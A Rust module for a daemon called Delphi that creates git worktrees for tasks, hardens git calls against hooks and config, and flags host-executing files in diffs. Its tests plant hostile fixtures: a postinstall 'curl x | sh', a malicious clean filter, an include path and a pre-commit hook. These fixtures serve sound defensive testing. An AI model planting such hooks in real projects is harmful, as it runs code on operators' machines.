//! Task worktrees and the hardened git calls Delphi makes on them (`specs/008` §4, `specs/006` §3.1).
//!
//! * A worktree lives under the workspace home, never in the project checkout, on a branch
//!   `delphi/<task-id>` cut from the project's `HEAD`.
//! * **Every git call is made by the daemon, outside the sandbox**, with the git directory and work tree
//!   given explicitly (never discovered from content a sandboxed process could have written), the system
//!   and user config disabled, hooks and external commands switched off, and a minimal environment.
//! * A project whose own config carries `include` directives or content filters is refused: those run
//!   programs on files a build can influence.
//! * [`Worktree::diff`] reports what changed against the base commit and flags files that execute on the
//!   operator's machine once merged (the Red **host-execution** badge at merge gate 5).

use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};

#[derive(Debug, PartialEq, Eq)]
pub enum GitError {
    Io(String),
    /// A git command failed; stderr is kept short and is never shown to a model.
    Failed { args: String, stderr: String },
    BadTaskId(String),
    NotAGitRepo(PathBuf),
    UnsafeConfig(Vec<String>),
    Exists(PathBuf),
}

impl std::fmt::Display for GitError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            GitError::Io(m) => write!(f, "{}", m),
            GitError::Failed { args, stderr } => write!(f, "git {} failed: {}", args, stderr),
            GitError::BadTaskId(id) => write!(f, "`{}` is not a valid task id (letters, digits, `_`, `-`)", id),
            GitError::NotAGitRepo(p) => write!(f, "{} is not a git repository with at least one commit", p.display()),
            GitError::UnsafeConfig(keys) => write!(f, "the project's git config sets {}, which would run programs on files a build can write; remove them (or use a clone without them) to allow worktrees", keys.join(", ")),
            GitError::Exists(p) => write!(f, "{} already exists", p.display()),
        }
    }
}

impl std::error::Error for GitError {}

/// Settings every daemon git call carries.
const HARDENING: &[&str] = &[
    "core.fsmonitor=false",
    "core.hooksPath=/dev/null",
    "core.pager=cat",
    "core.editor=true",
    "core.askpass=true",
    "core.sshCommand=false",
    "core.untrackedCache=false",
    "protocol.file.allow=never",
    "protocol.ext.allow=never",
    "diff.external=",
    "commit.gpgSign=false",
    "tag.gpgSign=false",
    "gc.auto=0",
    "maintenance.auto=false",
    "advice.detachedHead=false",
];

fn git_command(git_dir: Option<&Path>, work_tree: Option<&Path>, home: &Path) -> Command {
    let mut c = Command::new("git");
    c.env_clear();
    // PATH only so `git` can find its helpers; HOME points at an empty directory so no user config is read.
    c.env("PATH", std::env::var_os("PATH").unwrap_or_else(|| "/usr/bin:/bin".into()));
    c.env("HOME", home).env("XDG_CONFIG_HOME", home).env("GIT_CONFIG_NOSYSTEM", "1").env("GIT_CONFIG_GLOBAL", "/dev/null").env("GIT_TERMINAL_PROMPT", "0").env("GIT_OPTIONAL_LOCKS", "0").env("LC_ALL", "C");
    for h in HARDENING {
        c.arg("-c").arg(h);
    }
    c.arg("-c").arg("user.name=Delphi").arg("-c").arg("user.email=delphi@localhost.invalid");
    if let Some(g) = git_dir {
        c.arg("--git-dir").arg(g);
    }
    if let Some(w) = work_tree {
        c.arg("--work-tree").arg(w);
    }
    c.stdin(Stdio::null());
    c
}

fn run(mut c: Command, label: &str) -> Result<String, GitError> {
    let out = c.output().map_err(|e| GitError::Io(format!("cannot run git: {}", e)))?;
    if out.status.success() {
        Ok(String::from_utf8_lossy(&out.stdout).into_owned())
    } else {
        Err(GitError::Failed { args: label.into(), stderr: String::from_utf8_lossy(&out.stderr).trim().chars().take(300).collect() })
    }
}

fn valid_task_id(id: &str) -> bool {
    !id.is_empty() && id.len() <= 64 && id.chars().all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-')
}

/// Config keys in a project's local config that would run programs on worktree content.
fn unsafe_config(project: &Path, home: &Path) -> Result<Vec<String>, GitError> {
    let mut c = git_command(None, None, home);
    c.arg("-C").arg(project).args(["config", "--local", "--list", "--name-only", "-z"]);
    let out = c.output().map_err(|e| GitError::Io(e.to_string()))?;
    let text = String::from_utf8_lossy(&out.stdout);
    let mut bad: Vec<String> = text
        .split('\0')
        .map(|k| k.to_lowercase())
        .filter(|k| k.starts_with("include.") || k.starts_with("includeif.") || (k.starts_with("filter.") && (k.ends_with(".clean") || k.ends_with(".smudge") || k.ends_with(".process"))))
        .collect();
    bad.sort();
    bad.dedup();
    Ok(bad)
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Worktree {
    pub task_id: String,
    pub path: PathBuf,
    pub branch: String,
    pub project: PathBuf,
    pub base_sha: String,
    /// `<project>/.git/worktrees/<name>`, recorded at creation and never re-read from the worktree.
    git_dir: PathBuf,
    /// An empty directory used as `HOME` for git, so no user config is read.
    scratch_home: PathBuf,
    /// The project had uncommitted changes the worktree does not contain.
    pub project_was_dirty: bool,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct FileChange {
    pub path: String,
    pub status: char,
    pub added: u64,
    pub removed: u64,
    pub host_exec: bool,
}

#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct DiffSummary {
    pub head_sha: String,
    pub files: Vec<FileChange>,
}

impl DiffSummary {
    pub fn added(&self) -> u64 {
        self.files.iter().map(|f| f.added).sum()
    }
    pub fn removed(&self) -> u64 {
        self.files.iter().map(|f| f.removed).sum()
    }
    pub fn host_exec(&self) -> Vec<&FileChange> {
        self.files.iter().filter(|f| f.host_exec).collect()
    }
}

/// Files that run on the operator's machine, outside any sandbox, once merged and opened by an IDE, a
/// shell or git (`specs/008` §4). `extra` is the configurable `host_exec_paths` list (path prefixes or
/// `*.ext` globs).
pub fn is_host_exec(path: &str, extra: &[String]) -> bool {
    let p = path.trim_start_matches("./");
    let name = p.rsplit('/').next().unwrap_or(p);
    let lower = name.to_lowercase();
    if name == "build.rs" || lower == "makefile" || lower == "gnumakefile" || lower == ".envrc" || lower == ".gitattributes" || lower == ".gitmodules" || lower.starts_with("rust-toolchain") {
        return true;
    }
    if p.starts_with(".github/") || p.starts_with(".vscode/") || p.starts_with(".idea/") || p.starts_with(".cargo/config") || p.contains("/.cargo/config") {
        return true;
    }
    extra.iter().any(|e| match e.strip_prefix("*.") {
        Some(ext) => p.ends_with(&format!(".{}", ext)),
        None => p == e || p.starts_with(&format!("{}/", e.trim_end_matches('/'))),
    })
}

/// A `package.json` runs code through its `scripts` (and lifecycle hooks), so a change to that object is
/// host execution; a change to dependencies alone is a dependency change, not this.
fn package_scripts_changed(base: Option<&str>, head: Option<&str>) -> bool {
    let scripts = |t: Option<&str>| t.and_then(|t| serde_json::from_str::<serde_json::Value>(t).ok()).map(|v| v["scripts"].clone()).unwrap_or(serde_json::Value::Null);
    scripts(base) != scripts(head)
}

pub struct Worktrees {
    root: PathBuf,
    scratch_home: PathBuf,
}

impl Worktrees {
    /// `root` is `<workspace>/worktrees`.
    pub fn new(root: &Path) -> Worktrees {
        Worktrees { root: root.to_path_buf(), scratch_home: root.join(".git-home") }
    }

    fn home(&self) -> Result<&Path, GitError> {
        std::fs::create_dir_all(&self.scratch_home).map_err(|e| GitError::Io(e.to_string()))?;
        Ok(&self.scratch_home)
    }

    pub fn path_for(&self, task_id: &str) -> PathBuf {
        self.root.join(task_id)
    }

    /// Cut `delphi/<task-id>` from the project's `HEAD` into a new worktree.
    pub fn create(&self, project: &Path, task_id: &str) -> Result<Worktree, GitError> {
        if !valid_task_id(task_id) {
            return Err(GitError::BadTaskId(task_id.into()));
        }
        let home = self.home()?.to_path_buf();
        let project = std::fs::canonicalize(project).map_err(|e| GitError::Io(format!("{}: {}", project.display(), e)))?;
        let mut c = git_command(None, None, &home);
        c.arg("-C").arg(&project).args(["rev-parse", "--verify", "--quiet", "HEAD^{commit}"]);
        let base_sha = run(c, "rev-parse HEAD").map_err(|_| GitError::NotAGitRepo(project.clone()))?.trim().to_string();
        let bad = unsafe_config(&project, &home)?;
        if !bad.is_empty() {
            return Err(GitError::UnsafeConfig(bad));
        }
        let path = self.path_for(task_id);
        if path.exists() {
            return Err(GitError::Exists(path));
        }
        std::fs::create_dir_all(&self.root).map_err(|e| GitError::Io(e.to_string()))?;
        let branch = format!("delphi/{}", task_id);
        let mut c = git_command(None, None, &home);
        c.arg("-C").arg(&project).args(["worktree", "add", "--quiet", "-b", &branch]).arg(&path).arg(&base_sha);
        run(c, "worktree add")?;
        let path = std::fs::canonicalize(&path).map_err(|e| GitError::Io(e.to_string()))?;
        // Read the linked git directory once, now, before any sandboxed process has touched the worktree.
        let gitfile = std::fs::read_to_string(path.join(".git")).map_err(|e| GitError::Io(e.to_string()))?;
        let git_dir = gitfile.trim().strip_prefix("gitdir:").map(|g| PathBuf::from(g.trim())).ok_or_else(|| GitError::Io("the new worktree has no gitdir pointer".into()))?;
        let mut c = git_command(None, None, &home);
        c.arg("-C").arg(&project).args(["status", "--porcelain", "--untracked-files=no"]);
        let dirty = !run(c, "status")?.trim().is_empty();
        let wt = Worktree { task_id: task_id.into(), path, branch, project, base_sha, git_dir, scratch_home: home, project_was_dirty: dirty };
        // Kept beside the worktrees, where no sandboxed process can write, so a restarted daemon trusts it
        // instead of re-reading anything from the worktree itself.
        let meta = serde_json::json!({"project": wt.project, "branch": wt.branch, "base_sha": wt.base_sha, "git_dir": wt.git_dir, "project_was_dirty": dirty});
        let meta_dir = self.root.join(".meta");
        std::fs::create_dir_all(&meta_dir).map_err(|e| GitError::Io(e.to_string()))?;
        std::fs::write(meta_dir.join(format!("{}.json", task_id)), meta.to_string()).map_err(|e| GitError::Io(e.to_string()))?;
        Ok(wt)
    }

    /// Re-attach to a worktree this daemon created earlier (after a restart).
    pub fn adopt(&self, task_id: &str) -> Result<Worktree, GitError> {
        if !valid_task_id(task_id) {
            return Err(GitError::BadTaskId(task_id.into()));
        }
        let text = std::fs::read_to_string(self.root.join(".meta").join(format!("{}.json", task_id))).map_err(|e| GitError::Io(format!("no record of a worktree for {}: {}", task_id, e)))?;
        let v: serde_json::Value = serde_json::from_str(&text).map_err(|e| GitError::Io(e.to_string()))?;
        let get = |k: &str| v[k].as_str().map(String::from).ok_or_else(|| GitError::Io(format!("worktree record lacks `{}`", k)));
        let path = std::fs::canonicalize(self.path_for(task_id)).map_err(|e| GitError::Io(format!("the worktree for {} is gone: {}", task_id, e)))?;
        Ok(Worktree {
            task_id: task_id.into(),
            path,
            branch: get("branch")?,
            project: PathBuf::from(get("project")?),
            base_sha: get("base_sha")?,
            git_dir: PathBuf::from(get("git_dir")?),
            scratch_home: self.home()?.to_path_buf(),
            project_was_dirty: v["project_was_dirty"].as_bool().unwrap_or(false),
        })
    }
}

impl Worktree {
    fn git(&self) -> Command {
        git_command(Some(&self.git_dir), Some(&self.path), &self.scratch_home)
    }

    /// Stage everything the build produced (nothing is ever staged from a `.git` segment) and commit it.
    /// `None` means there was nothing to commit. Hooks never run.
    pub fn commit_all(&self, message: &str, author: &str) -> Result<Option<String>, GitError> {
        let mut c = self.git();
        c.args(["add", "--all", "--force", "--", "."]);
        run(c, "add")?;
        let mut c = self.git();
        c.args(["diff", "--cached", "--quiet"]);
        if c.status().map_err(|e| GitError::Io(e.to_string()))?.success() {
            return Ok(None);
        }
        let mut c = self.git();
        c.arg("-c").arg(format!("user.name={}", author)).args(["commit", "--quiet", "--no-verify", "--no-gpg-sign", "-m", message]);
        run(c, "commit")?;
        Ok(Some(self.head()?))
    }

    pub fn head(&self) -> Result<String, GitError> {
        let mut c = self.git();
        c.args(["rev-parse", "HEAD"]);
        Ok(run(c, "rev-parse")?.trim().to_string())
    }

    fn show(&self, rev: &str, path: &str) -> Option<String> {
        let mut c = self.git();
        c.args(["show", &format!("{}:{}", rev, path)]);
        run(c, "show").ok()
    }

    /// What `HEAD` changes against the base commit, with the host-execution flag per file.
    pub fn diff(&self, host_exec_paths: &[String]) -> Result<DiffSummary, GitError> {
        let head_sha = self.head()?;
        let mut c = self.git();
        c.args(["diff", "--no-ext-diff", "--no-textconv", "--no-renames", "-z", "--numstat"]).arg(&self.base_sha).arg("HEAD");
        let numstat = run(c, "diff --numstat")?;
        let mut c = self.git();
        c.args(["diff", "--no-ext-diff", "--no-textconv", "--no-renames", "-z", "--name-status"]).arg(&self.base_sha).arg("HEAD");
        let names = run(c, "diff --name-status")?;
        // `-z` output: `A\0path\0` pairs for name-status; `added\tremoved\tpath\0` for numstat.
        let mut status = std::collections::HashMap::new();
        let mut it = names.split('\0').filter(|s| !s.is_empty());
        while let (Some(s), Some(p)) = (it.next(), it.next()) {
            status.insert(p.to_string(), s.chars().next().unwrap_or('M'));
        }
        let mut files = Vec::new();
        for rec in numstat.split('\0').filter(|s| !s.is_empty()) {
            let mut parts = rec.splitn(3, '\t');
            let (a, r, path) = (parts.next().unwrap_or("0"), parts.next().unwrap_or("0"), parts.next().unwrap_or(""));
            if path.is_empty() {
                continue;
            }
            let mut host = is_host_exec(path, host_exec_paths);
            if !host && path.rsplit('/').next() == Some("package.json") {
                host = package_scripts_changed(self.show(&self.base_sha, path).as_deref(), self.show("HEAD", path).as_deref());
            }
            files.push(FileChange { path: path.to_string(), status: status.get(path).copied().unwrap_or('M'), added: a.parse().unwrap_or(0), removed: r.parse().unwrap_or(0), host_exec: host });
        }
        files.sort_by(|a, b| (!a.host_exec, &a.path).cmp(&(!b.host_exec, &b.path)));
        Ok(DiffSummary { head_sha, files })
    }

    /// The unified diff of one file against the base (for the approval card), without any external driver.
    pub fn file_diff(&self, path: &str, max_bytes: usize) -> Result<String, GitError> {
        let mut c = self.git();
        c.args(["diff", "--no-ext-diff", "--no-textconv", "--no-renames", &self.base_sha, "HEAD", "--", path]);
        let mut d = run(c, "diff")?;
        if d.len() > max_bytes {
            let mut end = max_bytes;
            while !d.is_char_boundary(end) {
                end -= 1;
            }
            d.truncate(end);
            d.push_str("\n… (truncated)");
        }
        Ok(d)
    }

    /// Remove the worktree and its branch. The project's `.git/worktrees/` entry goes with it.
    pub fn remove(&self) -> Result<(), GitError> {
        let mut c = git_command(None, None, &self.scratch_home);
        c.arg("-C").arg(&self.project).args(["worktree", "remove", "--force"]).arg(&self.path);
        let first = run(c, "worktree remove");
        if first.is_err() {
            let _ = std::fs::remove_dir_all(&self.path);
            let mut c = git_command(None, None, &self.scratch_home);
            c.arg("-C").arg(&self.project).args(["worktree", "prune"]);
            run(c, "worktree prune")?;
        }
        let mut c = git_command(None, None, &self.scratch_home);
        c.arg("-C").arg(&self.project).args(["branch", "-D", &self.branch]);
        let _ = run(c, "branch -D");
        Ok(())
    }
}

#[cfg(test)]
pub(crate) mod tests {
    use super::*;
    use std::fs;

    /// Turn an existing directory of files into a repository with one commit, using the same hardened calls.
    pub(crate) fn init_repo(p: &Path, scratch_home: &Path) {
        fs::create_dir_all(scratch_home).unwrap();
        for args in [vec!["init", "--quiet", "-b", "main"], vec!["add", "--all"], vec!["commit", "--quiet", "-m", "init"]] {
            let mut c = git_command(None, None, scratch_home);
            c.arg("-C").arg(p).args(&args);
            run(c, "setup").unwrap();
        }
    }

    /// A project repository with one commit.
    pub(crate) fn project(dir: &Path) -> PathBuf {
        let p = dir.join("proj");
        fs::create_dir_all(p.join("src")).unwrap();
        fs::write(p.join("src/lib.rs"), "pub fn a() {}\n").unwrap();
        fs::write(p.join("package.json"), "{\"name\":\"x\",\"scripts\":{\"test\":\"true\"},\"dependencies\":{}}\n").unwrap();
        init_repo(&p, &dir.join("gh"));
        p
    }

    fn fx() -> (tempfile::TempDir, PathBuf, Worktrees) {
        let d = tempfile::tempdir().unwrap();
        let root = fs::canonicalize(d.path()).unwrap();
        let p = project(&root);
        let w = Worktrees::new(&root.join("ws/worktrees"));
        (d, p, w)
    }

    #[test]
    fn a_worktree_is_cut_from_head_outside_the_project_and_leaves_it_clean() {
        let (_d, p, w) = fx();
        let wt = w.create(&p, "t_0001").unwrap();
        assert!(wt.path.starts_with(fs::canonicalize(&w.root).unwrap()) && !wt.path.starts_with(&p));
        assert_eq!((wt.branch.as_str(), wt.project_was_dirty), ("delphi/t_0001", false));
        assert!(wt.path.join("src/lib.rs").exists() && wt.path.join(".git").is_file());
        // The project checkout itself is untouched: no new files, no new branch checked out.
        let mut c = git_command(None, None, &wt.scratch_home);
        c.arg("-C").arg(&p).args(["status", "--porcelain"]);
        assert_eq!(run(c, "status").unwrap(), "");
        assert!(matches!(w.create(&p, "t_0001"), Err(GitError::Exists(_))));
        // After a daemon restart the same worktree is re-adopted from the record kept beside it.
        let again = Worktrees::new(&w.root).adopt("t_0001").unwrap();
        assert_eq!((again.path.clone(), again.branch.clone(), again.base_sha.clone()), (wt.path.clone(), wt.branch.clone(), wt.base_sha.clone()));
        fs::write(again.path.join("n.txt"), "n").unwrap();
        assert!(again.commit_all("adopted", "builder").unwrap().is_some());
        assert!(Worktrees::new(&w.root).adopt("t_9999").is_err());
        assert!(matches!(w.create(&p, "../escape"), Err(GitError::BadTaskId(_))));
    }

    #[test]
    fn a_dirty_project_is_reported_not_copied() {
        let (_d, p, w) = fx();
        fs::write(p.join("src/lib.rs"), "pub fn dirty() {}\n").unwrap();
        let wt = w.create(&p, "t_0002").unwrap();
        assert!(wt.project_was_dirty);
        assert_eq!(fs::read_to_string(wt.path.join("src/lib.rs")).unwrap(), "pub fn a() {}\n", "the worktree has the committed state only");
    }

    #[test]
    fn commit_and_diff_flag_files_that_run_on_the_operators_machine() {
        let (_d, p, w) = fx();
        let wt = w.create(&p, "t_0003").unwrap();
        assert_eq!(wt.commit_all("nothing", "builder").unwrap(), None, "no change, no commit");
        fs::write(wt.path.join("src/lib.rs"), "pub fn a() {}\npub fn b() {}\n").unwrap();
        fs::write(wt.path.join("build.rs"), "fn main() {}\n").unwrap();
        fs::create_dir_all(wt.path.join(".github/workflows")).unwrap();
        fs::write(wt.path.join(".github/workflows/ci.yml"), "on: push\n").unwrap();
        fs::write(wt.path.join("package.json"), "{\"name\":\"x\",\"scripts\":{\"test\":\"true\",\"postinstall\":\"curl x | sh\"},\"dependencies\":{}}\n").unwrap();
        let sha = wt.commit_all("work", "builder").unwrap().unwrap();
        let d = wt.diff(&[]).unwrap();
        assert_eq!(d.head_sha, sha);
        let flagged: Vec<&str> = d.host_exec().iter().map(|f| f.path.as_str()).collect();
        assert_eq!(flagged, [".github/workflows/ci.yml", "build.rs", "package.json"], "host-executed files come first");
        let lib = d.files.iter().find(|f| f.path == "src/lib.rs").unwrap();
        assert_eq!((lib.status, lib.added, lib.removed, lib.host_exec), ('M', 1, 0, false));
        // A dependency-only package.json change is not host execution.
        fs::write(wt.path.join("package.json"), "{\"name\":\"x\",\"scripts\":{\"test\":\"true\"},\"dependencies\":{\"left-pad\":\"1\"}}\n").unwrap();
        wt.commit_all("deps", "builder").unwrap();
        assert!(!wt.diff(&[]).unwrap().files.iter().any(|f| f.path == "package.json" && f.host_exec));
        assert!(wt.file_diff("src/lib.rs", 10_000).unwrap().contains("+pub fn b() {}"));
        // The commit carries the role as author and ran no hook.
        let mut c = wt.git();
        c.args(["log", "-1", "--format=%an"]);
        assert_eq!(run(c, "log").unwrap().trim(), "builder");
    }

    #[test]
    fn the_configurable_host_exec_list_extends_the_defaults() {
        let extra = vec!["tools/deploy".to_string(), "*.sh".to_string()];
        assert!(is_host_exec("tools/deploy/run.py", &extra) && is_host_exec("scripts/x.sh", &extra));
        assert!(!is_host_exec("tools/deployment/x", &extra) && !is_host_exec("src/main.rs", &extra));
        for p in ["Makefile", "sub/Makefile", ".envrc", ".gitattributes", ".gitmodules", "rust-toolchain.toml", ".cargo/config.toml", "crates/a/build.rs", ".vscode/tasks.json", ".idea/x.xml"] {
            assert!(is_host_exec(p, &[]), "{}", p);
        }
    }

    #[test]
    fn hooks_in_the_project_never_run_for_daemon_commits() {
        let (_d, p, w) = fx();
        let hook = p.join(".git/hooks/pre-commit");
        let marker = p.parent().unwrap().join("HOOK-RAN");
        fs::write(&hook, format!("#!/bin/sh\ntouch {}\n", marker.display())).unwrap();
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(&hook, fs::Permissions::from_mode(0o755)).unwrap();
        let wt = w.create(&p, "t_0004").unwrap();
        fs::write(wt.path.join("x.txt"), "x").unwrap();
        wt.commit_all("c", "builder").unwrap().unwrap();
        assert!(!marker.exists(), "a pre-commit hook ran");
    }

    #[test]
    fn a_project_with_content_filters_or_includes_is_refused() {
        let (_d, p, w) = fx();
        let home = w.scratch_home.clone();
        fs::create_dir_all(&home).unwrap();
        for (k, v) in [("filter.evil.clean", "touch /tmp/x"), ("include.path", "/tmp/evil.cfg")] {
            let mut c = git_command(None, None, &home);
            c.arg("-C").arg(&p).args(["config", "--local", k, v]);
            run(c, "config").unwrap();
        }
        match w.create(&p, "t_0005") {
            Err(GitError::UnsafeConfig(keys)) => assert_eq!(keys, ["filter.evil.clean", "include.path"]),
            other => panic!("{:?}", other),
        }
    }

    #[test]
    fn removal_leaves_no_branch_or_metadata_in_the_project() {
        let (_d, p, w) = fx();
        let wt = w.create(&p, "t_0006").unwrap();
        wt.remove().unwrap();
        assert!(!wt.path.exists());
        let mut c = git_command(None, None, &wt.scratch_home);
        c.arg("-C").arg(&p).args(["branch", "--list", "delphi/*"]);
        assert_eq!(run(c, "branch").unwrap().trim(), "");
        assert!(!p.join(".git/worktrees/t_0006").exists());
    }

    #[test]
    fn a_non_repository_or_an_empty_one_is_refused() {
        let d = tempfile::tempdir().unwrap();
        let w = Worktrees::new(&d.path().join("wt"));
        assert!(matches!(w.create(d.path(), "t_1"), Err(GitError::NotAGitRepo(_))));
    }
}
